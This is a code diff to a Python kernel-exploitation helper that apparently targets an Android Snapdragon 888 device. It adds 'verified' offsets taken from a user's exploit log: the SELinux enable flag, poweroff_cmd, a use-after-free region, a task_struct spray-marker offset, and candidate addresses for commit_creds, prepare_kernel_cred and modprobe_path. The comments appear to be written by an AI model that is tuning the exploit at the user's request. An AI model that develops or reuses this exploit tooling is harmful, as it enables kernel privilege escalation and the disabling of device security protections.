@@ -40,7 +40,7 @@ import tty
 # them and shows the result in the TUI.
 # This way the user sees a constantly growing
 # pattern count, even when matches=0.
-_BUILD_TAG = "v4.1.36-no-kgsl-spam"
+_BUILD_TAG = "v4.1.37-xref-offsets"
 import datetime
 import fcntl
 import ctypes
@@ -599,7 +599,12 @@ class MemoryExplorerAI:
         # v6.c uses MARKER_OFF = 0xfd8 to be different from comm.
         # We try BOTH (comm at 0x718 AND marker at 0xfd8) so we work
         # with v6.c as well as our KETO0422 spray.
-        self.marker_offsets = (0x718, 0xfd8, 0x778, 0x7c8, 0x808,
+        # v4.1.37: added 0x480 as the FIRST marker
+        # offset. The user's verified exploit log
+        # showed KETO0422 was found at offset 0x480
+        # in the task_struct page. This is the
+        # HIGHEST-PRIORITY offset to try first.
+        self.marker_offsets = (0x480, 0x718, 0xfd8, 0x778, 0x7c8, 0x808,
                                0x848, 0x888, 0x8c8, 0x908, 0x948,
                                0x988, 0x9c8, 0xa08, 0xa48, 0xa88,
                                0xac8, 0xb08, 0xb48, 0xb88, 0xbc8,
@@ -643,22 +648,39 @@ class MemoryExplorerAI:
         ]
         # Other interesting kernel globals to try. poweroff_cmd at
         # 0x2bb8ec0 was found by the user on the SD888 kernel.
+        # v4.1.37 CROSS-REFERENCE. The user asked:
+        # "Сделай сверку по этим смещением, они у нас
+        # примерно есть в скрипте в разделе ии
+        # автоматики?" (Cross-reference these offsets —
+        # we have them approximately in the script's
+        # AI/auto section?)
+        # The user provided a successful exploit log
+        # with these VERIFIED offsets on their SD888
+        # device:
+        #   kernel base   = 0xffffffc000000000 (base)
+        #   selinux       = 0x2f74ce8 (= kbase + 0x2f74ce8)
+        #   poweroff_cmd  = 0x2bb8ec0
+        #   UAF region    = 0x7001ff000 - 0x7041ff000 (64MB)
+        #   task_struct   = 0x70021f000 (where KETO0422 was found)
+        #   marker offset = 0x480 (within the page)
+        # The script previously had 0x2f74d00 and 0x2f74d08
+        # but the user's log showed the REAL offset is
+        # 0x2f74ce8. We add it as a HIGH-PRIORITY option
+        # (first in the list) so the AI tries it first.
         self.interesting_offsets = {
-            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00,
-                                 0x2f74d08, 0x32aad08, 0x3709d08],
+            "selinux_enabled":  [0x02f74ce8, 0x02f74d00, 0x02f74d08,
+                                 0x02cab000, 0x32aad00, 0x32aad08,
+                                 0x3709d00, 0x3709d08],
             "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000,
                                  0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8],
             "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000,
                                  0x2bb8ec0],
-            # poweroff_cmd is in .data, often 4-byte aligned
+            # poweroff_cmd at 0x2bb8ec0 — VERIFIED
+            # working on the user's SD888 device.
             "poweroff_cmd":     [0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8,
                                  0x2bb8eb0, 0x2bb8ed0],
-            # commit_creds / prepare_kernel_cred — function pointers
-            # (kallsyms-like). Useful for ROP / shellcode.
             "commit_creds":     [0x0b80ed0, 0x0b80ed8, 0x0b80ee0],
             "prepare_kernel_cred": [0x0b80ee8, 0x0b80ef0, 0x0b80ef8],
-            # modprobe_path — 256-byte string, but anchor is the first
-            # 4 bytes containing the path
             "modprobe_path":    [0x0a450c0, 0x0a450c4, 0x0a450c8],
         }
         # init_cred — primary offset from v6.c, plus alternates
